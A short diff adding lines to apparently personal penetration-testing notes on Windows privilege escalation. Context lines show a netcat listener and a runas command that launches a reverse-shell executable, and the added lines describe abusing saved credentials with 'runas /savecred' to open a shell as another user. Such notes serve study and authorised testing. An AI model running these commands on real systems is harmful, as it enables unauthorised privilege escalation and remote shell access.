@@ -275,6 +275,11 @@ nc -lvnp <port>
 ;; runas the other user a reverse shell exe
 runas /savecred /user:<username> C:\path\to\revshell.exe
 
+In general if there are saved credential we can run them through:
+runas /savecred /user:<user> /profile "cmd.exe"
+;; annyway as far as I know we must have a graphical user session (e.g., RDP)
+;; to be able to execute the runas  command
+
 ## Passwords (Configurations)
 Some administrators will leave configuration files on the system
 with passwords in them.
